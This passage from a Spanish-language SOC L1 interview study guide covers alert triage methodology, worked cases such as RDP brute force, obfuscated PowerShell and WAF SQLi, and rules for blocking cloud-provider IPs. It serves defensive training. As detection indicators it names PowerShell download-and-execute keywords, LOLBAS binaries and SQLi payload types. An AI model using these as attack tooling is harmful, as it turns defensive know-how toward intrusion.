- ¿Cuenta privilegiada? (Domain Admin, cuenta de servicio).
- ¿Tipo de táctica MITRE? (Impact y Credential Access son top).
- ¿Cliente con SLA agresivo o sector regulado?

**Paso 4 — Triage rápido (¿es real o FP?)**
- ¿Hay regla de tuning conocida? ¿FP recurrente documentado?
- ¿Coincide con un mantenimiento programado del cliente?
- ¿La IP origen está en allowlist / es proveedor conocido?
- Si en 2-3 minutos puedes descartar como FP **con criterio**, hazlo y documenta. Si no, profundiza.

**Paso 5 — Investigación profunda**
- Pivotar sobre el indicador clave: host → procesos → red → archivos → registry → persistencia.
- Buscar **scope**: ¿el mismo IOC en otros hosts? ¿el mismo usuario haciendo cosas raras en otro lado?
- Construir **timeline** de actividades.
- Mapear a MITRE ATT&CK.
- Threat Intel: VirusTotal, AbuseIPDB, GreyNoise, AlienVault OTX para IOCs.

**Paso 6 — Concluir y decidir acción**
- Veredicto: True Positive / False Positive / Benigno / Inconcluso.
- Impacto: confirmado / potencial / descartado.
- Acción: bloquear / aislar / resetear / monitorizar / cerrar / escalar.
- **Justificar la acción antes de hacerla.** Si vas a bloquear una IP de Amazon, tienes que poder explicar por qué (ver 6.4).

**Paso 7 — Documentar y comunicar**
- Ticket con cronología, IOCs, acciones, mapeo MITRE, pendientes.
- Comunicación al cliente proporcional a la severidad.
- Si la regla genera ruido: feedback al equipo de content engineering para tuning.

**Mantra de un caso**: *Veo → entiendo → contextualizo → priorizo → triajo → investigo → concluyo → actúo → documento.*

### 6.2 Caso canónico — Brute Force aplicando la metodología

Brute force es **el caso básico** que probablemente te pongan. Es simple en superficie pero permite demostrar metodología. Así se resuelve sin atragantarse:

**Alerta**: SIEM dispara `Brute Force RDP` en `SRV-RDP-EXT-02` desde IP `185.x.x.x`, 87 fallos en 6 minutos, regla con umbral 20/5min.

**Paso 1 — Entender**: módulo SIEM (correlación de Event 4625 con LogonType=10 RDP) — fidelidad media. La regla cuenta logons fallidos por IP origen, no por usuario destino. Hay que mirar si fue contra una cuenta o muchas (eso cambia la naturaleza: brute force vs spraying).

**Paso 2 — Contexto**:
- Host: `SRV-RDP-EXT-02`. Por el nombre parece un Remote Desktop Gateway expuesto.
- Usuarios objetivo: extraerlos del Event 4625. Si salen `administrator`, `admin`, `test`, `guest`, `oracle`, `backup` → diccionario clásico, escaneo automatizado. Si sale un único usuario real del cliente → ataque dirigido.
- Origen: 185.x.x.x. Reputación en AbuseIPDB, GreyNoise. ASN: ¿VPS, residencial, cloud?
- Cuándo: si es madrugada y domingo, fuera de cualquier patrón legítimo.
- Hipótesis inicial.

**Paso 3 — Criticidad**:
- Activo: gateway RDP expuesto = entrada potencial al dominio. Crítico.
- Cuenta: si alguno de esos usuarios existe y tiene contraseña débil → game over.
- MITRE: T1110.001 (Brute Force) → Initial Access / Credential Access.

**Paso 4 — Triage rápido**:
- ¿IP en allowlist? ¿Mantenimiento programado? ¿FP conocido?
- **LA pregunta**: ¿hay alguno de esos 4625 acompañado de un **4624 exitoso** desde la misma IP? Si la respuesta es sí, **el caso cambia de severidad inmediatamente**.

**Paso 5 — Investigación**:
- Confirmar 0 logons exitosos desde esa IP en las últimas 24-48h (no solo durante el ataque).
- ¿Esa IP había aparecido antes contra otros hosts del cliente? Pivotar a SIEM por la IP.
- ¿Hay **otros hosts del mismo cliente** recibiendo brute force desde otras IPs simultáneamente? Posible campaña.
- ¿Los **usuarios** que están siendo probados existen en el AD del cliente? Si sí, peligro mayor.

**Paso 6 — Conclusión y acción**:
- Veredicto: True Positive (ataque real), pero **fallido**. Impacto: ninguno confirmado.
- Acción inmediata:
  - Bloquear IP en firewall perimetral (justificado: reputación pésima + actividad maliciosa confirmada + sin razón de negocio para permitirla).
  - Verificar configuración del RDP gateway: ¿NLA activo? ¿Account lockout policy? ¿MFA en RDP?
- Acción de fondo (recomendación al cliente):
  - RDP no debería estar expuesto directo a internet. Recomendar VPN + MFA o solución tipo Azure Bastion / ZTNA.

**Paso 7 — Documentar**:
- Ticket con timeline, IOCs (IP, usuarios probados), acciones, MITRE T1110.001.
- Severidad: Medium (intento sin éxito, pero contra activo crítico).
- Comunicación al cliente: correo informativo + recomendación de hardening.

**Lo que NO haces como L1**: cerrar la alerta como FP porque "siempre llegan brute forces a ese RDP". Si llega siempre, la regla está bien y el cliente está mal protegido — eso hay que escalarlo, no silenciarlo.

### 6.3 Otros casos populares con la metodología aplicada (versión rápida)

#### A) PowerShell ofuscado en endpoint (EDR comportamental)

**Lo crítico**: módulo comportamental, no firma → fidelidad media-alta pero hay que confirmar.
**Pasos clave**:
1. **Process tree**: ¿quién es el padre de `powershell.exe`? Si es `winword.exe`/`outlook.exe`/`mshta.exe` → casi seguro malicioso. Si es `explorer.exe` con un usuario admin → posiblemente legítimo (admin haciendo cosas).
2. **Línea de comandos**: decodificar el `-enc` (base64). Si dentro hay `IEX`, `DownloadString`, `Net.WebClient`, `FromBase64String` anidados, `WMI`, `Add-Type` con código C# → malicioso.
3. **Conexiones de red** del proceso: ¿saca tráfico fuera? ¿a dónde?
4. **Persistencia** creada por ese PS: Run keys, tareas, servicios.
5. Decisión: aislar host si ejecución confirmada, escalar a L2.

#### B) Hit de Threat Intel en conexión saliente

**Lo crítico**: una conexión a una IP/dominio en una feed de TI **no es un compromiso confirmado**, es un indicador.
**Pasos clave**:
1. ¿Qué feed disparó? Las hay con muchísimos FP (feeds genéricas) y las hay de alta calidad (TI privadas, vendor TI).
2. ¿La feed sigue marcando esa IP como activa hoy? Las IOCs caducan rápido.
3. ¿Qué proceso hizo la conexión? Si es el navegador del usuario → posiblemente clic en algo. Si es un proceso del sistema en un servidor sin usuario interactivo → mucho más grave.
4. ¿Cuánto tráfico? ¿Patrón de beaconing?
5. Decisión: si proceso anómalo + tráfico continuado → aislar y escalar. Si es navegador y un único hit → revisar historial del usuario y bloquear dominio.

#### C) Impossible travel en O365 / Entra ID

**Lo crítico**: módulo de UEBA/risk de Microsoft. Fidelidad **variable**: VPNs corporativas, móviles cambiando de red, viajes legítimos generan FP frecuentes.
**Pasos clave**:
1. Confirmar las dos ubicaciones: Madrid 09:00 y Singapur 09:30 → real impossible. Madrid 09:00 y Lisboa 10:00 → eso lo hace una VPN.
2. ¿Qué IPs? ¿alguna es proveedor de VPN conocido (NordVPN, Mullvad, ProtonVPN)?
3. ¿La cuenta tiene MFA y se cumplió? ¿O fue session token reutilizado?
4. ¿Acciones post-login en la "ubicación rara"? Reglas de reenvío de correo, descarga masiva de archivos, consentimientos OAuth nuevos, envío masivo.
5. Decisión: si hay actividad sospechosa post-login → reset password + revoke sessions + escalar. Si solo es el evento sin actividad → contactar al usuario para confirmar.

#### D) Detección WAF de SQLi contra app pública

**Lo crítico**: módulo firma WAF, fidelidad alta para detección, pero hay que confirmar **si llegó a la aplicación o el WAF lo bloqueó**.
**Pasos clave**:
1. **Acción del WAF**: `BLOCK` o `ALERT-ONLY`. Si bloqueado → impacto cero, queda investigar fuente. Si solo alertó → confirmar si la app respondió 200, 500 o error de DB.
2. **Tipo de ataque**: payload concreto (`UNION SELECT`, blind con `SLEEP`, error-based). Te dice si hay reconocimiento manual o tooling tipo sqlmap.
3. User-Agent, frecuencia de requests: scanner automático o manual.
4. ¿Otras URLs probadas desde la misma IP? Probablemente sí.
5. Decisión: bloquear IP si externa con reputación mala. Si la app respondió de forma anómala (500 con stack trace) → escalar a equipo de DevSecOps del cliente para hardening.

#### E) Malware detectado y puesto en cuarentena por el AV/EDR (firma)

**Lo crítico**: módulo de firma, **fidelidad muy alta**, pero el caso no termina ahí.
**Pasos clave** (esta es una **trampa típica de entrevista** — "ya está bloqueado, ¿qué más haces?"):
1. ¿Cómo llegó el archivo? Descarga del navegador, adjunto de correo, USB, share interno. **Esa es la vía**.
2. ¿Cuándo llegó vs cuándo se ejecutó? Pudo estar dormido X tiempo.
3. ¿Se ejecutó **antes** de que el motor lo detectara? Mirar timestamps. Bloqueado en pre-ejecución es muy distinto a bloqueado post-ejecución (este último puede haber dejado huella).
4. Hash → VirusTotal → familia → TTPs conocidos de esa familia → buscar IOCs adicionales en el host y en la red.
5. ¿El mismo hash está en otros hosts? Puede que en otros lo bloqueara antes pero no se reportó al SOC.
6. Decisión: si fue prevención pura (pre-ejecución) y un único host → cerrar con limpieza. Si hay sospecha de ejecución previa → triaje completo del host como si estuviera comprometido.

### 6.4 Bloquear (o no) una IP de Amazon, Google, Cloudflare, Microsoft...

Esto es **una pregunta de criterio** que en Evolutio cae seguro. La respuesta corta: **nunca bloquees rangos completos de proveedores cloud principales**, pero a menudo sí puedes bloquear IPs específicas. Lo importante es **justificar**.

#### El problema

Más del 50% de internet legítimo hoy vive en AWS, Azure, GCP, Cloudflare, Akamai, Fastly. Si bloqueas:
- Un rango completo de **AWS** → tiras servicios SaaS que usan tus clientes (CRMs, herramientas de RRHH, integraciones API, GitHub, etc.).
- Un rango completo de **Cloudflare** → te cargas el acceso a una porción enorme de la web.
- Un rango completo de **Azure** → puedes romper Microsoft 365, Teams, SharePoint, Defender propio.
- Un rango completo de **Google** → te cargas Google Workspace, YouTube corporativo, GCP.

#### Marco de decisión (usar **antes** de bloquear)

**1. Identifica el dueño del rango (ASN)**
- Herramientas: `whois`, `bgp.he.net`, IPinfo, RIPEstat.
- Saber el ASN te dice si es AWS (16509, 14618), Microsoft (8075), Google (15169), Cloudflare (13335), DigitalOcean (14061), OVH (16276), Hetzner (24940), etc.

**2. Identifica el servicio detrás**
- Si es tráfico saliente HTTPS hacia esa IP → mira el **SNI/hostname** en los logs del proxy/firewall, no la IP. La IP en cloud es prácticamente irrelevante.
- Si es tráfico entrante → mira el `Host` header (HTTP) o el certificado.
- DNS reverse a veces ayuda: `s3-1-w.amazonaws.com`, `ec2-x-x-x-x.compute-1.amazonaws.com`, `googleusercontent.com`, `*.cloudfront.net`.

**3. Determina si el servicio es legítimo para el cliente**
- ¿El cliente usa ese SaaS? ¿Tienen relación contractual?
- ¿Es un servicio de Microsoft 365 que el cliente paga? Bloquearlo es romper la operación.

**4. Decide el nivel de granularidad del bloqueo**
- IP individual (`/32`)
- Rango pequeño (`/24`) si toda la subred es maliciosa
- Por **SNI/hostname** (lo ideal en HTTPS si el firewall lo soporta)
- Por **categoría** de URL filtering
- Listas dinámicas (TI feeds) en lugar de bloqueo manual permanente

#### Casos típicos y decisión

| Caso | Acción correcta |
|------|-----------------|
| **AWS EC2 IP haciendo brute force RDP** contra cliente | Bloquear la IP específica `/32`. Es una instancia rentada por el atacante. **No** bloquear AWS. Reportar a `abuse@amazonaws.com`. |
| **AWS S3 bucket sirviendo malware** (`bucket.s3.amazonaws.com`) | Bloquear por **hostname/SNI**, no por IP (la IP cambia). Reportar a AWS abuse. |
| **Cloudflare IP recibiendo exfiltración** | Investigar el SNI/Host. La IP es proxy, el origen real está detrás. Bloquear por hostname. **Nunca** rangos de Cloudflare. |
| **Azure IP que resuelve a `*.outlook.com` o `*.office.com`** | **No bloquear**. Es Microsoft 365. Si hay actividad sospechosa, es un problema de identidad/cuenta, no de red. |
| **Azure IP de un VM de tenant ajeno haciendo C2** | Bloquear IP específica. Es una VM rentada en Azure por el atacante. Reportar a Microsoft abuse. |
| **`googleusercontent.com` sospechoso** | Cuidado: puede ser Google Drive (legítimo), Google Sites (legítimo), o abuso (atacante usa Google como hosting). Investigar el path/contenido. Bloquear por URL/hostname específico, no por IP. |
| **DigitalOcean / Linode / Vultr / Hetzner / OVH** haciendo C2 | Más fácil bloquear `/24` o incluso ASN si el cliente nunca usa esos rangos. Estos VPS baratos se usan masivamente para C2. |
| **Tor exit node** | La mayoría de SOCs tiene allowlist / blocklist de Tor. Para empresas no-Tor-friendly, bloqueo total justificado. |
| **VPN comerciales** (NordVPN, Mullvad...) | Depende del cliente. Si la política prohíbe VPN para acceso corporativo → bloquear. Si no, monitorizar. |
| **Akamai / Fastly / CloudFront** | Son CDN. Bloquear por hostname/categoría. Bloquear por IP es contraproducente. |

#### Cómo se justifica un bloqueo en el ticket

Plantilla mental para verbalizar en la entrevista:

> "Se bloquea la IP `X.X.X.X` (`/32`) en el firewall perimetral. La IP pertenece al ASN `XXXX` (proveedor `AWS`), pero es una instancia EC2 individual con reputación negativa confirmada en AbuseIPDB (`200+` reports), GreyNoise (`malicious`) y VirusTotal (`5/93`), y se ha observado actividad de brute force contra el activo `SRV-RDP-EXT-02`. El cliente no tiene servicios legítimos hospedados en esa IP. El bloqueo es específico (`/32`) para no afectar el resto del rango de AWS, donde el cliente tiene integraciones operativas. Adicionalmente se reporta a `abuse@amazonaws.com` con timestamp y logs."

Esa frase, dicha en una entrevista, pesa mucho.

#### Qué pasa si bloqueas mal

Si bloqueas una IP que era M365 y el cliente no puede mandar correo durante una hora — eres tú quien explica eso. Por eso:
- En cliente importante / acción de gran alcance: **valida con L2 o con el cliente** antes de bloquear si tienes la más mínima duda.
- Documenta **exactamente** qué bloqueaste, dónde, cuándo, y con qué justificación. Reversible siempre.
- Bloqueos temporales (24-48h) son preferibles a permanentes para casos no 100% confirmados.

### 6.5 ¿Qué módulo detectó la alerta? Por qué importa

La fuente de la alerta determina **fidelidad esperada, qué datos tienes ya y qué tienes que ir a buscar**. Verbalizar esto en la entrevista demuestra criterio.

| Módulo / fuente | Qué te dice ya | Fidelidad típica | Próximos pasos críticos |
|-----------------|----------------|------------------|--------------------------|
| **EDR firma / AV** (hash conocido) | Hay un binario malo confirmado, posiblemente en cuarentena | Muy alta | Confirmar acción tomada; investigar **vector de llegada** y si se ejecutó antes |
| **EDR comportamental** (detección por patrón) | Hay un comportamiento sospechoso, sin certeza de malware | Alta (con FP posibles) | Process tree, línea de comandos, hash, conexiones, persistencia |
| **WAF firma** (SQLi, XSS, RCE pattern) | Hubo un payload malicioso a una URL específica | Media-alta | Acción del WAF (block/alert), respuesta de la app, IP origen, otros hits |
| **IPS firma** (red) | Tráfico match con firma de exploit/malware | Media | Confirmar dirección, contexto, si el host destino es vulnerable |
| **SIEM correlación** (regla compuesta) | Suma de N eventos cumple un patrón | Variable (depende de la regla) | Revisar **eventos individuales** que dispararon la regla; sin eso, vas ciego |
| **Threat Intel match** | Una IP/dominio/hash apareció en una feed | Variable (las hay buenas y malísimas) | Verificar si el IOC sigue activo y la calidad de la feed; correlacionar con tráfico real |
| **UEBA / Anomalía** (impossible travel, etc.) | Comportamiento atípico vs baseline | Baja-media (muchos FP) | Validar si la anomalía tiene explicación legítima (VPN, viaje, cambio de dispositivo) |
| **Email Gateway** (Defender O365, Proofpoint, Mimecast) | Correo marcado como phishing/malware | Alta | Headers, sandbox del adjunto, scope (¿a cuántos llegó?), purga |
| **CASB / cloud-native** (GuardDuty, Defender for Cloud Apps) | API call anómala, login sospechoso a SaaS | Variable | Logs cloud, contexto de identidad, MFA, scope |
| **DLP** | Contenido sensible saliendo | Alta para regla bien tuneada | Confirmar si fue accidental o intencionado, canal de salida |
| **Vulnerability scanner** | Vulnerabilidad detectada en un activo | Alta para descubrimiento, no es un evento de ataque per se | No es alerta de SOC clásica; pero si hay exploit público, vigilar tráfico hacia ese host |
| **Reporte de usuario** ("este correo me parece raro") | Un humano vio algo sospechoso | Variable, pero **muy valiosa** | Tratar siempre con seriedad; usuarios formados detectan lo que las máquinas no |

#### Por qué esto importa en una entrevista

Cuando te ponen un caso, **lo primero que tienes que preguntar (o asumir y verbalizar) es: "¿qué módulo disparó la alerta?"**. Eso reorienta toda la investigación:

- **Firma de AV/EDR** y archivo en cuarentena: el caso casi nunca es "¿es malware?" sino "¿llegó a ejecutarse y cómo entró?".
- **EDR comportamental**: el caso es "¿es realmente malicioso o un admin/usuario haciendo algo legítimo raro?". Hay que reconstruir contexto.
- **TI feed**: el caso es "¿la feed es buena? ¿el IOC sigue vivo? ¿qué proceso hizo la conexión?".
- **Correlación SIEM**: el caso es "¿realmente la suma de estos eventos significa lo que la regla cree, o es coincidencia?".
- **Reporte de usuario**: máxima atención, mínimo desprecio, aunque sea "solo" un correo.

Decir en voz alta *"primero miro qué módulo lo detectó porque eso me dice qué fidelidad esperar y qué tengo que ir a buscar"* — eso es lo que un L1 con criterio dice.

---

## APÉNDICE — CHULETA ULTRA-RÁPIDA (memorizar)

**Procesos LOLBAS top**: `certutil`, `bitsadmin`, `mshta`, `rundll32`, `regsvr32`, `wmic`, `powershell`, `msbuild`, `installutil`, `cmstp`, `odbcconf`, `forfiles`.

**Rutas sospechosas**: `%TEMP%`, `%APPDATA%\Roaming`, `%APPDATA%\Local`, `%PUBLIC%`, `C:\PerfLogs`, `C:\ProgramData`, `C:\Windows\Temp`.

**Persistencia top-5**: Run keys, Scheduled Tasks, Services (7045), WMI Event Subscription, Startup folder.

**Señales ransomware en vivo**: borrado shadow copies, apagado Defender, creación masiva de archivos con extensión única, nota de rescate (`readme.txt`, `HELP_DECRYPT.*`), cifrado en fileserver SMB.

**IOCs prioritarios en un caso**: hash SHA256, IP C2, dominio C2, usuario comprometido, host paciente cero, timestamp de primera actividad maliciosa.

**Fórmula del report ejecutivo en 3 frases**:
1. Qué pasó (una frase, sin jerga).
2. Qué hicimos (una frase, acciones clave).
3. Qué necesitamos del cliente / próximos pasos (una frase).

**Mantra de caso**: *Veo → entiendo → contextualizo → priorizo → triajo → investigo → concluyo → actúo → documento.*

**Primera pregunta de cualquier caso**: *¿Qué módulo disparó la alerta?* (eso te dice fidelidad y qué buscar).

**Bloqueo IP cloud (AWS/Azure/GCP/Cloudflare)**: nunca bloquear rangos completos. Bloquear `/32` específico o por SNI/hostname. Justificar siempre con ASN + reputación + ausencia de uso legítimo por el cliente.

**Mantra de turno**: *Contener → Investigar → Comunicar → Documentar → Escalar → Aprender.*

---

¡Suerte en la entrevista! Vas sobrado de base técnica para L1. Lo que van a valorar en Evolutio es:
- **Orden mental** en la investigación.
- **Humildad** para escalar lo que no sabes.
- **Curiosidad** por seguir creciendo a Purple/Threat Hunting.
- **Capacidad de comunicar** con cliente.

Respiraciones profundas, sé tú mismo, y recuerda que ya trabajaste ahí — conoces la cultura.
